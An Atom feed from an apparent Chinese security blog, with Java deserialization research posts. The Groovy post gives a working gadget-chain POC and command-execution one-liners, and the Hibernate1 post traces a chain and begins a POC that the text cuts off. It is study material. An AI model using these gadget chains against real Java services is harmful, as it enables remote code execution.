<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-07-18T02:27:33.658Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试</title>
    <link href="https://ke1nys.github.io/posts/8ddb4c74.html"/>
    <id>https://ke1nys.github.io/posts/8ddb4c74.html</id>
    <published>2023-07-18T02:10:28.000Z</published>
    <updated>2023-07-18T02:27:33.658Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="152b8dc2f8b97507f4f94d8930791be027f249f5a5f3fa42334d74987b4b64fb">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a4d0bfb7ff1045dab3f9bce09aed7c65b72a5cf1365959cc03b50a6d00ba51a256937bd6f838b61ede456b68db5c420595ea39afe5281b0bad21b2aa8e6e36748bedf23d55437eb2e9f41fd3c718a10215395c58674198df302f1469aa52eefd4ce1a3d2b1b82cc88d6e38c704c80465c2f4c15bb000943b7b9ba77782c958b4d6ad502180b504664fca00d6c2ad39e1b1f5ca92802ebdfb8fd885ab5a6f913503</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://ke1nys.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java-Groovy</title>
    <link href="https://ke1nys.github.io/posts/3776a7e3.html"/>
    <id>https://ke1nys.github.io/posts/3776a7e3.html</id>
    <published>2023-07-17T12:26:52.000Z</published>
    <updated>2023-07-19T11:35:32.939Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了Python、Ruby 和 Smalltalk 语言的优秀特性，比如动态类型转换、闭包和元编程支持。 Groovy与 Java可以很好的互相调用并结合编程 ，比如在写 Groovy 的时候忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本。比起Java，Groovy语法更加的灵活和简洁，可以用更少的代码来实现Java实现的同样功能。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>Groovy : 1.7.0-2.4.3</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span>  <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(mc, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先从这个类开始入手  (<strong>就是最后执行代码的地方</strong>)</p><p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p><p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p><p><img src="../images/image-20230718191350775.png" alt="image-20230718191350775"></p><p>​    </p><p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p><p><img src="../images/image-20230718191421942.png" alt="image-20230718191421942"></p><p>这里就是先使用<code>MethodClosure</code>来进行传值  <strong>分别是传一个对象和这个对象的某个方法</strong></p><p>由于这个<code>doCall</code>()是个<code>protected</code>方法   得使用反射调用 </p><p><img src="../images/image-20230718191723300.png" alt="image-20230718191723300"></p><p>这个最后一步的意思就是反射调用这个<code>doCall()</code>方法，然后传值是这个<code>calc</code></p><p><strong>m：就是等会会调用<code>doCall</code>这个方法</strong></p><p><strong><code>invoke(mc,&quot;calc&quot;)</code>  这个里面的<code>mc</code>指的是调用这个<code>MethodClosure</code> 里的<code>doCall</code>方法  <code>calc</code>是这个<code>daCall</code>的参数</strong></p><p><img src="../images/image-20230718192709132.png" alt="image-20230718192709132"></p><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;whoami&quot;</span>.execute().text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里切记生成文件的要选groovy，不然会执行不了</p><p><img src="../images/image-20230718192832925.png" alt="image-20230718192832925"></p><p>其实就是使用<code>Runtime.getRuntime().exec()</code>来执行</p><p><strong>如果在java中可以这样写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        methodClosure.call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 分析一波 下个断点</p><p><img src="../images/image-20230718200009817.png" alt="image-20230718200009817"></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line"><span class="string">&#x27;calc&#x27;</span>.execute()</span><br><span class="line"><span class="string">&quot;$&#123;&quot;</span>calc<span class="string">&quot;.execute()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">&quot;cmd /c dir&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&quot;</span>whoami<span class="string">&quot;.execute().text&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br><span class="line"><span class="type">def</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">println <span class="string">&quot;$&#123;cmd.execute().text&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p><p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p><p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code> 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p><p><img src="../images/image-20230718194334220.png" alt="image-20230718194334220"></p><p>看到这里就明白这条链的触发逻辑了。后面自然是使用 <code>AnnotationInvocationHandler</code> 将 <code>ConvertedClosure</code> 代理成 <code>Map</code> 类。这样在反序列化</p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p><strong>最终的POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Groovy.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装我们需要执行的对象</span></span><br><span class="line"><span class="type">MethodClosure</span>    <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"><span class="type">ConvertedClosure</span> <span class="variable">closure</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ConvertedClosure 的动态代理类实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">handler</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">SerializeUtil.readFileObject(fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">        MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719191853074.png" alt="image-20230719191853074"></p><p>调用entrySet，然后触发invoke</p><p><img src="../images/image-20230719192046197.png" alt="image-20230719192046197"></p><p>调用了<code>ConversionHandler#invoke()</code>方法</p><p><img src="../images/image-20230719192158196.png" alt="image-20230719192158196"></p><p><img src="../images/image-20230719192238123.png" alt="image-20230719192238123"></p><p>接着就会调用到<code>ConvertedClosure#invokeCustom()</code>方法   <strong>并且由于这个</strong></p><p><strong><code>methodName</code>和这个传进来的<code>method</code>的<code>name</code>一样 </strong> 就会调用<code>call</code>()方法</p><p><img src="../images/image-20230719192521353.png" alt="image-20230719192521353"></p><p><img src="../images/image-20230719192653618.png" alt="image-20230719192653618"></p><p>这里的话到最后就rce了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了</summary>
      
    
    
    
    
    <category term="java-Groovy" scheme="https://ke1nys.github.io/tags/java-Groovy/"/>
    
  </entry>
  
  <entry>
    <title>show-SSTI</title>
    <link href="https://ke1nys.github.io/posts/1834ebb1.html"/>
    <id>https://ke1nys.github.io/posts/1834ebb1.html</id>
    <published>2023-07-14T15:17:41.000Z</published>
    <updated>2023-07-14T15:20:09.990Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8bb28a15fc0bdaadd7e91dab2aa55874c3c940844d6cf831d2844b258f8d6531">1a90164da2a38547586d85c848ea23231e27efea37a3b1bfa89f409994387574</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-SSTI" scheme="https://ke1nys.github.io/tags/show-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>show-XXE</title>
    <link href="https://ke1nys.github.io/posts/9d7a060.html"/>
    <id>https://ke1nys.github.io/posts/9d7a060.html</id>
    <published>2023-07-14T09:51:43.000Z</published>
    <updated>2023-07-14T15:16:51.866Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a57f27d4864f5e5500d24962cb2c714021c6ed7e1cde1069c46baeeb16e50bdd"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-XXE" scheme="https://ke1nys.github.io/tags/show-XXE/"/>
    
  </entry>
  
  <entry>
    <title>java-Hibernate</title>
    <link href="https://ke1nys.github.io/posts/3531a825.html"/>
    <id>https://ke1nys.github.io/posts/3531a825.html</id>
    <published>2023-07-11T14:07:32.000Z</published>
    <updated>2023-07-13T16:25:10.425Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">参考链接1 </a>       <a href="https://su18.org/post/ysoserial-su18-3/#hibernate1">参考链接2</a></p><h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><p>这也是可以通过调用任意getter函数来进行代码执行的一个类</p><p><strong>首先先给上调用栈</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>我们还是老样子 从能够执行命令的地方开始分析</strong></p><p><code>BasicPropertyAccessor#get</code>  方法</p><p><img src="../images/image-20230711230854168.png" alt="image-20230711230854168"></p><p>这个的话是可以调用任意方法</p><p><strong>这里可控的两点就是<code>method</code>和这个<code>target</code>参数</strong></p><p><code>BasicPropertyAccessor#BasicGetter</code>  方法</p><p><img src="../images/image-20230711231133798.png" alt="image-20230711231133798"></p><p>这个类的构造方法是可以设置这个<code>method</code>方法的</p><p><code>BasicPropertyAccessor#creatGetter</code>  方法</p><p><img src="../images/image-20230711231410524.png" alt="image-20230711231410524"></p><p>跟进这个方法</p><p><code>BasicPropertyAccessor#getGetterOrNull</code>   方法</p><p><img src="../images/image-20230711231507249.png" alt="image-20230711231507249"></p><p>接着跟进这个方法</p><p><code>BasicPropertyAccessor#getterMethod</code>  方法</p><p><img src="../images/image-20230711231538300.png" alt="image-20230711231538300"></p><ul><li>首先第一步就是先获取到这个<code>theClass</code>这个类里的所有方法</li><li>然后判断这些方法是是否存在参数  如果存在参数的话就退出</li><li>接着就判断无参数的方法是否是<code>get</code>或者<code>is</code>开头的</li><li>如果满足以上条件的话就将get或is后面的东西转化为小写并返回</li></ul><p><img src="../images/image-20230711231914096.png" alt="image-20230711231914096"></p><p>在<code>BasicPropertyAccessor#getterMethod</code>执行完后  就会将method进行返回  然后就返回<code>BasicGetter</code>的构造方法  这样的话就给<code>method</code>给配置完成了</p><p><strong>知道上述的东西参数怎么配置完之后  我们就得找找谁能调用这个<code>get</code>方法</strong></p><p>经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p>​    <img src="../images/image-20230711232825523.png" alt="image-20230711232825523"></p><p>就是这两个方法</p><p><strong>接着找谁调用了<code>getPropertyValues</code>()方法，由于这是抽象类，因此该找实现类哪里调用了</strong></p><p><strong>但是抽象类我们无法调用，只能使用它的子类，</strong><code>AbstractComponentTuplizer</code> 有两个子类，一个是 <code>PojoComponentTuplizer</code>，一个是 <code>DynamicMapComponentTuplizer</code>，这对应着 <code>Hibernate</code> 的实体对象的类型，即 <code>pojo</code> 和 <code>dynamic-map</code>。<code>pojo</code> 代表将 <code>Hibernate</code> 类型映射为 Java 实体类，而 <code>dynamic-map</code> 将映射为 Map 对象。</p><p>这里选择 <code>PojoComponentTuplizer</code> 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getPropertyValues(Object component) <span class="keyword">throws</span> HibernateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (component == BackrefPropertyAccessor.UNKNOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.propertySpan];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.optimizer != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.optimizer.getAccessOptimizer() != <span class="literal">null</span> ? <span class="built_in">this</span>.optimizer.getAccessOptimizer().getPropertyValues(component) : <span class="built_in">super</span>.getPropertyValues(component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230712114037350.png" alt="image-20230712114037350"></p><p><strong>这里就是会调用到父类里的<code>getPropertyValues</code>方法</strong></p><p>而这个方法在<code>ComponentType</code>中又被调用</p><p><img src="../images/image-20230713002720265.png" alt="image-20230713002720265"></p><p>这里让<code>componentTuplizer</code>为<code>PojoComponentTuplizer</code>即可接上链子，而在该类的<code>getHashcode</code>方法中又调用了<code>getPropertyValue</code></p><p><img src="../images/image-20230713004928706.png" alt="image-20230713004928706"></p><p>此现在该着哪里可以接上<code>getHashcode</code>，这里就再正向分析一波，首先找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用<code>getHashcode</code>了的</p><p><img src="../images/image-20230713005144028.png" alt="image-20230713005144028"></p><p>那么就接着找谁调用了这个<code>initTransients</code>   这个方法</p><p><img src="../images/image-20230713005401438.png" alt="image-20230713005401438"></p><p>最后在这个<code>ValueHolder#getValue()</code>里带调用了这个<code>initialize</code>方法</p><p><strong>那么这个<code>getValue</code>方法是在这个<code>TypedValue#hashCode()</code>方法来调用</strong></p><p><img src="../images/image-20230713005511693.png" alt="image-20230713005511693"></p><p>（这个<code>this.hashcode</code>是在调用这个<code>initialize</code>的时候来给赋值的)</p><p><img src="../images/image-20230713005654920.png" alt="image-20230713005654920"></p><p><strong>那么我们现在就走到了<code>TypedValue#hashcode</code>这个方法这里了</strong></p><p><strong>那么有经验的师傅就能想到使用<code>hashMap</code>来当入口来触发了</strong></p><p><strong>(就是最外层就是<code>hashMap</code>)</strong></p><p><strong>POC如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span 